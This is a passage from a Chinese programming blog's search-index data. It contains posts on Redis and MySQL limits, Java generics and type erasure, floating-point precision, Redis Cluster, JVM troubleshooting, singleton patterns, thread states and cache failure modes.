","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/nowcoder/%E6%9F%A5%E6%89%BE%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/","series":["算法"],"tags":["牛客"],"title":"查找重复元素"},{"categories":["计算机科学"],"content":"1. redis可以容纳多少个键值对？单个键值的大小限制是？ 最多容纳 2^32 个key\nredis的key和string类型value限制均为512MB。\nstring类型：一个String类型的value最大可以存储512M\nlist类型：list的元素个数最多为2^32-1个，也就是4294967295个。\nset类型：元素个数最多为2^32-1个，也就是4294967295个。\nhash类型：键值对个数最多为2^32-1个，也就是4294967295个。\nzset类型：跟set类型相似。\n2. mysql varchar最大长度？ 65532 byte = 65535 byte (max row size) - 1 byte (not null flag) - 2 byte (记录实际长度)\n4.0版本以下，varchar(20)，指的是20字节，如果存放UTF8汉字时，只能存6个（每个汉字3字节） 5.0版本以上，varchar(20)，指的是20字符，无论存放的是数字、字母还是UTF8汉字（每个汉字3字节），都可以存放20个，最大大小是65532字节\nMySQL中varchar最大长度是多少？ 3. mysql sql命令执行顺序 定位表` -\u0026gt; `笛卡尔积` -\u0026gt; `过滤` -\u0026gt; `选择 `-\u0026gt; `展示 1.FORM: 对FROM的左边的表和右边的表计算笛卡尔积。产生虚表VT1\n2.ON: 对虚表VT1进行ON筛选，只有那些符合的行才会被记录在虚表VT2中。\n3.JOIN： 如果指定了OUTER JOIN（比如left join、 right join），那么保留表中未匹配的行就会作为外部行添加到虚拟表VT2中，产生虚拟表VT3, rug from子句中包含两个以上的表的话，那么就会对上一个join连接产生的结果VT3和下一个表重复执行步骤1~3这三个步骤，一直到处理完所有的表为止\n4.WHERE： 对虚拟表VT3进行WHERE条件过滤。只有符合的记录才会被插入到虚拟表VT4中。\n5.GROUP BY: 根据group by子句中的列，对VT4中的记录进行分组操作，产生VT5.\n6.CUBE | ROLLUP: 对表VT5进行cube或者rollup操作，产生表VT6.\n7.HAVING： 对虚拟表VT6应用having过滤，只有符合的记录才会被 插入到虚拟表VT7中。\n8.SELECT： 执行select操作，选择指定的列，插入到虚拟表VT8中。\n9.DISTINCT： 对VT8中的记录进行去重。产生虚拟表VT9.\n10.ORDER BY: 将虚拟表VT9中的记录按照\u0026lt;order_by_list\u0026gt;进行排序操作，产生虚拟表VT10.\n11.LIMIT：取出指定行的记录，产生虚拟表VT11, 并将结果返回。\nmysql 执行顺序_MySQL命令执行顺序 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/%E6%AD%BB%E8%AE%B0%E7%A1%AC%E8%83%8C/","series":["Manual"],"tags":["CS"],"title":"死记硬背"},{"categories":["编程思想"],"content":"泛型的好处  提供了一种类型安全检测机制 提升程序可读性  通配符 通配符的出现是为了指定泛型中的类型范围。\n通配符有 3 种形式。\n \u0026lt;?\u0026gt;被称作无限定的通配符。 \u0026lt;? extends T\u0026gt;被称作有上限的通配符。 \u0026lt;? super T\u0026gt;被称作有下限的通配符。   ? 其实代表的是未知类型，所以涉及到 ? 时的操作，一定与具体类型无关。\n有人说，\u0026lt;?\u0026gt;提供了只读的功能，也就是它删减了增加具体类型元素的能力，只保留与具体类型无关的功能。它不管装载在这个容器内的元素是什么类型，它只关心元素的数量、容器是否为空？我想这种需求还是很常见的吧。\n有同学可能会想，\u0026lt;?\u0026gt;既然作用这么渺小，那么为什么还要引用它呢？ \n个人认为，提高了代码的可读性，程序员看到这段代码时，就能够迅速对此建立极简洁的印象，能够快速推断源码作者的意图。\n类型擦除 在泛型类被类型擦除的时候，之前泛型类中的类型参数部分如果没有指定上限，如 \u0026lt;T\u0026gt;则会被转译成普通的 Object 类型，如果指定了上限如 \u0026lt;T extends String\u0026gt;则类型参数就被替换成类型上限。\n类型擦除带来的局限性 正常情况下，因为泛型的限制，编译器不让最后一行代码编译通过，因为类似不匹配，但是，基于对类型擦除的了解，利用反射，我们可以绕过这个限制。\n那么，利用反射，我们绕过编译器去调用 add 方法。\npublic class ToolTest { public static void main(String[] args) { List\u0026lt;Integer\u0026gt; ls = new ArrayList\u0026lt;\u0026gt;(); ls.add(23); //\tls.add(\u0026#34;text\u0026#34;);  try { Method method = ls.getClass().getDeclaredMethod(\u0026#34;add\u0026#34;,Object.class); method.invoke(ls,\u0026#34;test\u0026#34;); method.invoke(ls,42.9f); } catch (NoSuchMethodException e) { // TODO Auto-generated catch block  e.printStackTrace(); } catch (SecurityException e) { // TODO Auto-generated catch block  e.printStackTrace(); } catch (IllegalAccessException e) { // TODO Auto-generated catch block  e.printStackTrace(); } catch (IllegalArgumentException e) { // TODO Auto-generated catch block  e.printStackTrace(); } catch (InvocationTargetException e) { // TODO Auto-generated catch block  e.printStackTrace(); } for ( Object o: ls){ System.out.println(o); } } } 参考链接 Java 泛型，你了解类型擦除吗？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E6%B3%9B%E5%9E%8B/","series":["Manual"],"tags":["Java"],"title":"泛型"},{"categories":["编程思想"],"content":"结论  Java中单精度和双精度采用IEEE 754表示，能有效运算的范围大致是小数点后7位和15位 如果Java中默认的float和double不能满足你的精度要求，可以用BigDecimal，理论上它的精度只受限制与机器内存 如果BigDecimal仍无法满足需求，例如是无限循环小数的运算，可考虑设计分数系统保证计算的精度  1. IEEE 754 精度上限 编程语言中的浮点数一般都是 32 位的单精度浮点数 float 和 64 位的双精度浮点数 double，部分语言会使用 float32 或者 float64 区分这两种不同精度的浮点数。想要使用有限的位数表示全部的实数是不可能的，不用说无限长度的小数和无理数，因为长度的限制，有限小数在浮点数中都无法精确的表示。\n 单精度浮点数 float 总共包含 32 位，其中 1 位表示符号、8 位表示指数，最后 23 位表示小数； 双精度浮点数 double 总共包含 64 位，其中 1 位表示符号，11 位表示指数，最后 52 位表示小数；  我们以单精度浮点数 0.15625 为例:\n通过上图中的公式 (sign * 2^{exp}* (1+fraction))可以将浮点数的二进制表示转换成十进制的小数。0.15625 虽然还可以用单精度的浮点数精确表示，但是 0.1 和 0.2 只能使用浮点数表示近似的值：\n因为 0.2 和 0.1 只是指数稍有不同，所以上图中只展示了 0.1 对应的单精度浮点数，从上图的结果我们可以看出，0.1 和 0.2 在浮点数中只能用近似值来代替，精度十分有限，因为单精度浮点数的小数位为 23，双精度的小数位为 52，同时都隐式地包含首位的 1，所以它们的精度在十进制中分别是(log_{10}(2^{24})\\approx 7.22) 和 (log_{10}(2^{53})\\approx 15.95) 位。\n因为 0.1 和 0.2 使用单精度浮点数表示的实际值为 0.100000001490116119384765625 和 0.200000002980232238769531257，所以它们在相加后就得到的结果与我们在一开始看到的非常相似：\n上图只是使用单精度浮点数表示的数字，如果使用双精度浮点数，最终结果中的 3 和 4 之间会有更多的 0，但是小数出现的顺序是非常相似的。浮点数的运算法则相对来说比较复杂，感兴趣的读者可以自行搜索相关的资料，我们在这里不展开介绍了。\n2. BigDecimal 为了解决浮点数的精度问题，一些编程语言引入了十进制的小数 Decimal。Decimal 在不同社区中都十分常见，如果编程语言没有原生支持 Decimal，我们在开源社区也一定能够找到使用特定语言实现的 Decimal 库。Java 通过 BigDecimal 提供了无限精度的小数，该类中包含三个关键的成员变量 intVal、scale 和 precision：\npublic class BigDecimal extends Number implements Comparable\u0026lt;BigDecimal\u0026gt; { private BigInteger intVal; private int scale; private int precision = 0; ... } 当我们使用 BigDecimal 表示 1234.56 时，BigDecimal 中的三个字段会分别以下的内容：\n intVal 中存储的是去掉小数点后的全部数字，即 123456； scale 中存储的是小数的位数，即 2； prevision 中存储的是全部的有效位数，小数点前 4 位，小数点后 2 位，即 6；  BigDecimal 这种使用多个整数的方法避开了二进制无法准确表示部分十进制小数的问题，因为 BigInteger 可以使用数组表示任意长度的整数，所以如果机器的内存资源是无限的，BigDecimal 在理论上也可以表示无限精度的小数。\n虽然部分编程语言实现了理论上无限精度的 BigDecimal，但是在实际应用中我们大多不需要无限的精度保证，C# 等编程语言通过 16 字节的 Decimal 提供的 28 ~ 29 位的精度，而在金融系统中使用 16 字节的 Decimal 一般就可以保证数据计算的准确性了。\n有理数 使用 Decimal 和 BigDecimal 虽然可以在很大程度上解决浮点数的精度问题，但是它们在遇到无限小数时仍然无能为力，使用十进制的小数永远无法准确地表示 1/3，无论使用多少位小数都无法避免精度的损失：\n当我们遇到这种情况时，使用有理数（Rational）是解决类似问题的最好方法，使用分数可以准确的表示 1/10、1/5 和 1/3\n这种解决精度问题的方法更接近原始的数学公式，分数的分子和分母是有理数结构体中的两个变量，多个分数的加减乘除操作与数学中对分数的计算没有任何区别，自然也就不会造成精度的损失，我们可以简单了解一下 Java 中有理数的实现7 ：\npublic class Rational implements Comparable\u0026lt;Rational\u0026gt; { private int num; // the numerator private int den; // the denominator public double toDouble() { return (double) num / den; } ... } 上述类中的 num 和 den 分别表示分数的分子和分母，它提供的 toDouble 方法可以将当前有理数转换成浮点数，因为浮点数在软件工程中虽然更加常用，当我们需要严密的科学计算时，可以使用有理数完成绝大多数的计算，并在最后转换回浮点数以减少可能出现的误差。\n然而需要注意的是，这种使用有理数计算的方式不仅在使用上相对比较麻烦，它在性能上也无法与浮点数进行比较，一次常见的加减法就需要使用几倍于浮点数操作的汇编指令，所以在非必要的场景中一定要尽量避免。\n参考链接： 为什么 0.1 + 0.2 = 0.3 为什么 0.1 + 0.2 = 0.300000004 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E6%B5%AE%E7%82%B9%E6%95%B0%E8%BF%90%E7%AE%97/","series":["Manual"],"tags":["Java"],"title":"浮点数运算"},{"categories":["编程思想"],"content":"主从能实现读能力进行扩展，但无法自动故障切换、写能力和存储能力；\n哨兵能自动故障切换，但无法对写能力和存储能力是无法进行扩展；\n集群能读能力、写能力、存储能力进行扩展，也能自动故障切换\n前言 上文我们聊了基于Sentinel的Redis高可用架构，了解了Redis基于读写分离的主从架构，同时也知道当Redis的master发生故障之后，Sentinel集群是如何执行failover的，以及其执行failover的原理是什么。\n这里大概再提一下，Sentinel集群会对Redis的主从架构中的Redis实例进行监控，一旦发现了master节点宕机了，就会选举出一个Sentinel节点来执行故障转移，从原来的slave节点中选举出一个，将其提升为master节点，然后让其他的节点去复制新选举出来的master节点。\n你可能会觉得这样没有问题啊，甚至能够满足我们生产环境的使用需求了，那我们为什么还需要Redis Cluster呢？\n1. 为什么需要Redis Cluster 的确，在数据上，有replication副本做保证；可用性上，master宕机会自动的执行failover。\n 那问题在哪儿呢？\n 首先Redis Sentinel说白了也是基于主从复制，在主从复制中slave的数据是完全来自于master。\n假设master节点的内存只有4G，那slave节点所能存储的数据上限也只能是4G。而且在之前的跟随杠精的视角一起来了解Redis的主从复制 文章中也说过，主从复制架构中是读写分离的，我们可以通过增加slave节点来扩展主从的读并发能力，但是写能力和存储能力是无法进行扩展的，就只能是master节点能够承载的上限。\n所以，当你只需要存储4G的数据时候的，基于主从复制和基于Sentinel的高可用架构是完全够用的。\n但是如果当你面临的是海量的数据的时候呢？16G、64G、256G甚至1T呢？现在互联网的业务里面，如果你的体量足够大，我觉得是肯定会面临缓存海量缓存数据的场景的。\n这就是为什么我们需要引入Redis Cluster。\n2. Redis Cluster是什么 知道了为什么需要Redis Cluster之后，我们就可以来对其一探究竟了。\n 那什么是Redis Cluster呢？\n 很简单，你就可以理解为n个主从架构组合在一起对外服务。Redis Cluster要求至少需要3个master才能组成一个集群，同时每个master至少需要有一个slave节点。\n这样一来，如果一个主从能够存储32G的数据，如果这个集群包含了两个主从，则整个集群就能够存储64G的数据。\n我们知道，主从架构中，可以通过增加slave节点的方式来扩展读请求的并发量，那Redis Cluster中是如何做的呢？虽然每个master下都挂载了一个slave节点，但是在Redis Cluster中的读、写请求其实都是在master上完成的。\nslave节点只是充当了一个数据备份的角色，当master发生了宕机，就会将对应的slave节点提拔为master，来重新对外提供服务。\n3. 节点负载均衡 知道了什么是Redis Cluster，我们就可以继续下面的讨论了。\n不知道你思考过一个问题没，这么多的master节点。我存储的时候，到底该选择哪个节点呢？一般这种负载均衡算法，会选择哈希算法。哈希算法是怎么做的呢？\n首先就是对key计算出一个hash值，然后用哈希值对master数量进行取模。由此就可以将key负载均衡到每一个Redis节点上去。这就是简单的哈希算法的实现。\n那Redis Cluster是采取的上面的哈希算法吗？答案是没有。\nRedis Cluster其实采取的是类似于一致性哈希的算法来实现节点选择的。那为什么不用哈希算法来进行实例选择呢？以及为什么说是类似的呢？我们继续讨论。\n因为如果此时某一台master发生了宕机，那么此时会导致Redis中所有的缓存失效。为什么是所有的？假设之前有3个master，那么之前的算法应该是 hash % 3，但是如果其中一台master宕机了，则算法就会变成 hash % 2，会影响到之前存储的所有的key。而这对缓存后面保护的DB来说，是致命的打击。\n4. 什么是一致性哈希 知道了通过传统哈希算法来实现对节点的负载均衡的弊端，我们就需要进一步了解什么是一致性哈希。\n我们上面提过哈希算法是对master实例数量来取模，而一致性哈希则是对2^32取模，也就是值的范围在[0, 2^32 -1]。一致性哈希将其范围抽象成了一个圆环，使用CRC16算法计算出来的哈希值会落到圆环上的某个地方。\n然后我们的Redis实例也分布在圆环上，我们在圆环上按照顺时针的顺序找到第一个Redis实例，这样就完成了对key的节点分配。我们举个例子。\n假设我们有A、B、C三个Redis实例按照如图所示的位置分布在圆环上，此时计算出来的hash值，取模之后位置落在了位置D，那么我们按照顺时针的顺序，就能够找到我们这个key应该分配的Redis实例B。同理如果我们计算出来位置在E，那么对应选择的Redis的实例就是A。\n即使这个时候Redis实例B挂了，也不会影响到实例A和C的缓存。\n例如此时节点B挂了，那之前计算出来在位置D的key，此时会按照顺时针的顺序，找到节点C。相当于自动的把原来节点B的流量给转移到了节点C上去。而其他原本就在节点A和节点C的数据则完全不受影响。\n这就是一致性哈希，能够在我们后续需要新增节点或者删除节点的时候，不影响其他节点的正常运行。\n5. 虚拟节点机制 但是一致性哈希也存在自身的小问题，例如当我们的Redis节点分布如下时，就有问题了。\n此时数据落在节点A上的概率明显是大于其他两个节点的，其次落在节点C上的概率最小。这样一来会导致整个集群的数据存储不平衡，AB节点压力较大，而C节点资源利用不充分。为了解决这个问题，一致性哈希算法引入了虚拟节点机制。\n在圆环中，增加了对应节点的虚拟节点，然后完成了虚拟节点到真实节点的映射。假设现在计算得出了位置D，那么按照顺时针的顺序，我们找到的第一个节点就是C #1，最终数据实际还是会落在节点C上。\n通过增加虚拟节点的方式，使ABC三个节点在圆环上的位置更加均匀，平均了落在每一个节点上的概率。这样一来就解决了上文提到的数据存储存在不均匀的问题了，这就是一致性哈希的虚拟节点机制。\n6. Redis Cluster采用的什么算法 上面提到过，Redis Cluster采用的是类一致性哈希算法，之所以是类一致性哈希算法是因为它们实现的方式还略微有差别。\n例如一致性哈希是对2^32取模，而Redis Cluster则是对2^14（也就是16384）取模。Redis Cluster将自己分成了16384个Slot（槽位）。通过CRC16算法计算出来的哈希值会跟16384取模，取模之后得到的值就是对应的槽位，然后每个Redis节点都会负责处理一部分的槽位，就像下表这样。\n   节点 处理槽位     A 0 - 5000   B 5001 - 10000   C 10001 - 16383    每个Redis实例会自己维护一份slot - Redis节点的映射关系，假设你在节点A上设置了某个key，但是这个key通过CRC16计算出来的槽位是由节点B维护的，那么就会提示你需要去节点B上进行操作。\n7. Redis Cluster如何做到高可用 不知道你思考过一个问题没，如果Redis Cluster中的某个master节点挂了，它是如何保证集群自身的高可用的？如果这个时候我们集群需要扩容节点，它该负责哪些槽位呢？我们一个一个问题的来看一下。\n集群如何进行扩容 我们开篇聊过，Redis Cluster可以很方便的进行横向扩容，那当新的节点加入进来的时候，它是如何获取对应的slot的呢？\n答案是通过reshard（重新分片）来实现。reshard可以将已经分配给某个节点的任意数量的slot迁移给另一个节点，在Redis内部是由redis-trib负责执行的。你可以理解为Redis其实已经封装好了所有的命令，而redis-trib则负责向获取slot的节点和被转移slot的节点发送命令来最终实现reshard。\n假设我们需要向集群中加入一个D节点，而此时集群内已经有A、B、C三个节点了。\n此时redis-trib会向A、B、C三个节点发送迁移出槽位的请求，同时向D节点发送准备导入槽位的请求，做好准备之后A、B、C这三个源节点就开始执行迁移，将对应的slot所对应的键值对迁移至目标节点D。最后redis-trib会向集群中所有主节点发送槽位的变更信息。\n高可用及故障转移 Redis Cluster中保证集群高可用的思路和实现和Redis Sentinel如出一辙，感兴趣的可以去看我之前写的关于Sentinel的文章Redis Sentinel-深入浅出原理和实战 。\n简单来说，针对A节点，某一个节点认为A宕机了，那么此时是主观宕机。而如果集群内超过半数的节点认为A挂了， 那么此时A就会被标记为客观宕机。\n一旦节点A被标记为了客观宕机，集群就会开始执行故障转移。其余正常运行的master节点会进行投票选举，从A节点的slave节点中选举出一个，将其切换成新的master对外提供服务。当某个slave获得了超过半数的master节点投票，就成功当选。\n当选成功之后，新的master会执行slaveof no one来让自己停止复制A节点，使自己成为master。然后将A节点所负责处理的slot，全部转移给自己，然后就会向集群发PONG消息来广播自己的最新状态。\n按照一致性哈希的思想，如果某个节点挂了，那么就会沿着那个圆环，按照顺时针的顺序找到遇到的第一个Redis实例。\n而对于Redis Cluster，某个key它其实并不关心它最终要去到哪个节点，他只关心他最终落到哪个slot上，无论你节点怎么去迁移，最终还是只需要找到对应的slot，然后再找到slot关联的节点，最终就能够找到最终的Redis实例了。\n那这个PONG消息又是什么东西呢？别急，下面就会聊到。\n8. 简单了解gossip协议 这就是Redis Cluster各个节点之间交换数据、通信所采用的一种协议，叫做gossip。\ngossip: 流言、八卦、小道消息 gossip是在1989年的论文上提出的，我看了一堆资料都说的是1987年发表的，但是文章里的时间明确是1989年1月份发表。\n感兴趣的可以去看看Epidemic Algorithms for Replicated . Database Maintenance ，在当时提出gossip主要是为了解决在分布式数据库中，各个副本节点的数据同步问题。但随着技术的发展，gossip后续也被广泛运用于信息扩散、故障探测等等。\nRedis Cluster就是利用了gossip来实现自身的信息扩散的。那使用gossip具体是如何通信的呢？\n很简单，就像图里这样。每个Redis节点每秒钟都会向其他的节点发送PING，然后被PING的节点会回一个PONG。\n9. gossip协议消息类型 Redis Cluster中，节点之间的消息类型有5种，分别是MEET、PING、PONG、FAIL和PUBLISH。这些消息分别传递了什么内容呢？我简单总结了一下。\n   消息类型 消息内容     MEET 给某个节点发送MEET消息，请求接收消息的节点加入到集群中   PING 每隔一秒钟，选择5个最久没有通信的节点，发送PING消息，检测对应的节点是否在线；同时还有一种策略是，如果某个节点的通信延迟大于了cluster-node-time的值的一半，就会立即给该节点发送PING消息，避免数据交换延迟过久   PONG 当节点接收到MEET或者PING消息之后，会回一个PONG消息给发送方，代表自己收到了MEET或者PING消息。同时，节点也可以主动的通过PONG消息向集群中广播自己的信息，让其他节点获取到自己最新的属性，就像完成了故障转移之后新的master向集群发送PONG消息一样   FAIL 用于广播自己的对某个节点的宕机判断，假设当前节点对A节点判断为宕机，就会立即向Redis Cluster广播自己对于A节点的判断，所有收到消息的节点就会对A节点做标记   PUBLISH 用于向指定的Channel发送消息，某个节点收到PUBLISH消息之后会直接在集群内广播，这样一来，客户端无论连接到任何节点都能够订阅这个Channel    10. 使用gossip的优劣 既然Redis Cluster选择了gossip，那肯定存在一些gossip的优点，我们接下来简单梳理一下。\n   优点 描述     扩展性 网络可以允许节点的任意增加和减少，新增加的节点的状态最终会与其他节点一致。   容错性 由于每个节点都持有一份完整元数据，所以任何节点宕机都不会影响gossip的运行   健壮性 与容错性类似，由于所有节点都持有数据，地位平台，是一个去中心化的设计，任何节点都不会影响到服务的运行   最终一致性 当有新的信息需要传递时，消息可以快速的发送到所有的节点，让所有的节点都拥有最新的数据    gossip可以在O(logN) 轮就可以将信息传播到所有的节点，为什么是O(logN)呢？因为每次ping，当前节点会带上自己的信息外加整个Cluster的1/10数量的节点信息，一起发送出去。你可以简单的把这个模型抽象为：\n 你转发了一个特别有意思的文章到朋友圈，然后你的朋友们都觉得还不错，于是就一传十、十传百这样的散播出去了，这就是朋友圈的裂变传播。\n 当然，gossip仍然存在一些缺点。例如消息可能最终会经过很多轮才能到达目标节点，而这可能会带来较大的延迟。同时由于节点会随机选出5个最久没有通信的节点，这可能会造成某一个节点同时收到n个重复的消息。\n 缺点\n 消息延迟 节点随机向少数几个节点发送消息，消息最终是通过多个轮次的散播而到达全网，不可避免的造成消息延迟 消息冗余 节点定期随机选择周围节点发送消息，而收到消息的节点也会重复该步骤；不可避免的引起同一节点消息多次接收，增加消息处理压力，一般通过文件校验和、缓存节点列表等方式来进行优化减少数据对比带来的性能损耗  基于以上优缺点分析，Gossip协议满足CAP分布式理论中基于AP场景的数据最终一致性处理，常见应用有：P2P网络通信、Apache Cassandra、Redis Cluster、Consul等，还有Apache Gossip框架的开源实现供Gossip协议的学习。\n 11. 总结 总的来说，Redis Cluster相当于是把Redis的主从架构和Sentinel集成到了一起，从Redis Cluster的高可用机制、判断故障转移以及执行故障转移的过程，都和主从、Sentinel相关，这也是为什么我在之前的文章里说，主从是Redis高可用架构的基石。\n参考 深度图解Redis Cluster原理 [分布式系列]Gossip协议 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/%E6%B7%B1%E5%BA%A6%E5%9B%BE%E8%A7%A3redis-cluster%E5%8E%9F%E7%90%86/","series":["Manual"],"tags":["Redis"],"title":"深度图解Redis Cluster原理"},{"categories":["编程思想"],"content":"  排除应用之外的影响因素： top(cpu)、free(内存)、df(磁盘)、dstat(网络流量)、pstack、vmstat、st1race(底层系统调用)\n  top 定位CPU 最高的进程\n  top -Hp pid 定位使用 CPU 最高的线程（或者 ps -mp pid -o THREAD,tid,time）\n  printf '0x%x' tid 线程 id 转化 16 进制\n  jstack pid | grep tid 找到线程堆栈\n5.1 gc线程（如下是查看gc情况的几种方式）\n👉🏿 查看gc 日志\n👉🏿 jstat -gcutil 进程号 统计间隔毫秒 统计次数（缺省代表一次统计）\n👉🏿 如果所在公司有对应用进行监控的组件当然更方便（比如Prometheus + Grafana）\n 结合内存dump日志分析：\n  哪些对象导致的内存溢出导致频繁gc（尤其是full gc）\n  如果不是内存溢出导致频繁gc，也可能是代码或者第三方依赖的包中有显示的System.gc()调用，此时可以通过添加 -XX:+DisableExplicitGC来禁用JVM对显示GC的响应。\n在分配堆外内存的时候，内存不足时会显示的调用System.gc()，如果显示gc被禁用，则可能会导致堆外内存溢出，所以堆外内存的回收最好就不要依赖jvm，主动回收吧。\n   5.2 业务线程\n👉🏿 关注线程堆栈的lock字段\n👉🏿 jstack -l pid | grep BLOCKED 查看阻塞态线程堆栈\n  ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E7%94%9F%E4%BA%A7%E9%97%AE%E9%A2%98%E5%AE%9A%E4%BD%8D/","series":["Manual"],"tags":["Java"],"title":"生产问题定位"},{"categories":["架构演进"],"content":"系统性能优化之并发编程 提升系统的QPS和吞吐量 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","series":["Manual"],"tags":["SA"],"title":"系统性能优化"},{"categories":["编程思想"],"content":"1. 使用synchronized 饱汉：双重检查锁定、饿汉、静态内部类、枚举 都属于利用synchronized同步原理实现\n1.1 饱汉：双重检查锁定（double-checked locking） public class SingleTon { // 静态实例变量加上volatile  private static volatile SingleTon instance; // 私有化构造函数  private SingleTon() {} // 双重检查锁  public static SingleTon getInstance() { if (instance == null) { synchronized(SingleTon.class){ if(instance == null){ instance = new SingleTon(); } } } return instance; } 1.2 饿汉 public class Singleton { private static Singleton instance = new Singleton(); private Singleton() { } public static Singleton getInstance() { return instance; } } 1.3 静态内部类 public class Singleton { private static class SingletonHolder { private static final Singleton INSTANCE = new Singleton(); } private Singleton() { } public static final Singleton getInstance() { return SingletonHolder.INSTANCE; } } 以上的静态内部类、饿汉等模式均是通过定义静态的成员变量，以保证单例对象可以在类初始化的过程中被实例化。\n这其实是利用了ClassLoader的线程安全机制。ClassLoader的loadClass方法在加载类的时候使用了synchronized关键字。\n所以， 除非被重写，这个方法默认在整个装载过程中都是线程安全的。所以在类加载过程中对象的创建也是线程安全的。\n1.4 枚举 public enum EnumFactory{ singletonFactory; private MySingleton instance; private EnumFactory(){//枚举类的构造方法在类加载是被实例化  instance = new MySingleton(); } public MySingleton getInstance(){ return instance; } } class MySingleton{//需要获实现单例的类，比如数据库连接Connection  public MySingleton(){} 枚举其实底层是依赖Enum类实现的，这个类的成员变量都是static类型的，并且在静态代码块中实例化的，和饿汉有点像， 所以他天然是线程安全的。\n2. 利用CAS原理 public class Singleton { private static final AtomicReference\u0026lt;Singleton\u0026gt; INSTANCE = new AtomicReference\u0026lt;Singleton\u0026gt;(); private Singleton() { } public static Singleton getInstance() { for (; ; ) { Singleton singleton = INSTANCE.get(); if (null != singleton) { return singleton; } singleton = new Singleton(); if (INSTANCE.compareAndSet(null, singleton)) { return singleton; } } } } 3. 使用ThreadLocal 与前面的方式不同的是，ThreadLocal 保证的是单个线程内部访问的是同一个实例，不同线程访问的不是同一个实例，即局部单例，并非全局单例。\npublic class Singleton { private static final ThreadLocal\u0026lt;Singleton\u0026gt; singleton = new ThreadLocal\u0026lt;Singleton\u0026gt;() { @Override protected Singleton initialValue() { return new Singleton(); } }; public static Singleton getInstance() { return singleton.get(); } private Singleton() { } } 序列化与反序列化破坏单例问题 序列化对象时，序列化前后得到对象不是同一个实例。解决办法就是在反序列化的过程中使用readResolve()方法，该方法在反序列化时会被调用，该方法不是接口定义的方法，有点儿约定俗成的感觉，单例实现的代码如下：\nimport java.io.ObjectStreamException; import java.io.Serializable; public class MySingleton implements Serializable { private static final long serialVersionUID = 1L; //内部类  private static class MySingletonHandler{ private static MySingleton instance = new MySingleton(); } private MySingleton(){} public static MySingleton getInstance() { return MySingletonHandler.instance; } //该方法在反序列化时会被调用，该方法不是接口定义的方法，有点儿约定俗成的感觉  protected Object readResolve() throws ObjectStreamException { System.out.println(\u0026#34;调用了readResolve方法！\u0026#34;); return MySingletonHandler.instance; } 参考链接： 高并发下线程安全的单例模式（最全最经典） 单例模式——线程安全的两种实现 面试官真是搞笑!让实现线程安全的单例,又不让使用synchronized! ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E5%8D%95%E4%BE%8B%E7%9A%84%E5%87%A0%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95/","series":["Manual"],"tags":["Java"],"title":"线程安全的单例的几种实现方法"},{"categories":["编程思想"],"content":"Linux线程的状态与调度 Java线程的6种状态及切换 Java 线程的生命周期中，在 Thread 类里有一个枚举类型 State，定义了线程的几种状态，分别有：\n New Runnable Blocked Waiting Timed Waiting Terminated  上图有误，根据Blocked注释可知：线程从Waiting或Timed Waiting状态恢复后，应该是去到Blocked状态\n Thread state for a thread blocked waiting for a monitor lock. A thread in the blocked state is waiting for a monitor lock to enter a synchronized block/method or reenter a synchronized block/method after calling Object.wait.\n sleep和wait区别 1、sleep方法是Thread类的静态方法；\nwait方法是Object类的成员方法\n2、sleep方法使当前线程暂停执行指定的时间，让出cpu给其他线程，但是它的监控状态依然保持着，当指定的时间到了又会自动恢复运行状态。在调用sleep方法后，线程不会释放对象锁；\n而当调用wait方法时，线程会放弃对象锁，进入等待此对象的等待锁定池，只有针对此对象调用notify()方法后本线程才进入对象锁定池处于准备状态。\n3、sleep方法有可能会抛出异常，所以需要进行异常处理；\nwait方法不需要处理\n4、sleep方法可以在任何地方使用；\nwait方法只能在同步方法和同步代码块中使用\n参考 Linux线程的状态与调度 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81/","series":["Manual"],"tags":["Java"],"title":"线程状态"},{"categories":["编程思想"],"content":"1. 缓存雪崩 1.1 什么是缓存雪崩？ 简介：缓存同一时间大面积的失效，所以，后面的请求都会落到数据库上，造成数据库短时间内承受大量请求而崩掉。\n1.2 有哪些解决办法？  事前：尽量保证整个 redis 集群的高可用性，发现机器宕机尽快补上。选择合适的内存淘汰策略。 事中：本地ehcache缓存 + hystrix限流\u0026amp;降级，避免MySQL崩掉 事后：利用 redis 持久化机制保存的数据尽快恢复缓存  2. 缓存穿透 2.1 什么是缓存穿透？ 缓存穿透说简单点就是大量请求的 key 根本不存在于缓存中，导致请求直接到了数据库上，根本没有经过缓存这一层。举个例子：某个黑客故意制造我们缓存中不存在的 key 发起大量请求，导致大量请求落到数据库。\n2.1 有哪些解决办法？ 最基本的就是首先做好参数校验，一些不合法的参数请求直接抛出异常信息返回给客户端。比如查询的数据库 id 不能小于 0、传入的邮箱格式不对的时候直接返回错误消息给客户端等等。\n 缓存无效 key（解决请求的 key 变化不频繁的情况） : 如果缓存和数据库都查不到某个 key 的数据就写一个到 redis 中去并设置过期时间，具体命令如下：SET key value EX 10086。这种方式可以解决请求的 key 变化不频繁的情况，如果黑客恶意攻击，每次构建的不同的请求key，会导致 redis 中缓存大量无效的 key 。很明显，这种方案并不能从根本上解决此问题。如果非要用这种方式来解决穿透问题的话，尽量将无效的 key 的过期时间设置短一点比如 1 分钟。 布隆过滤器（解决请求的 key 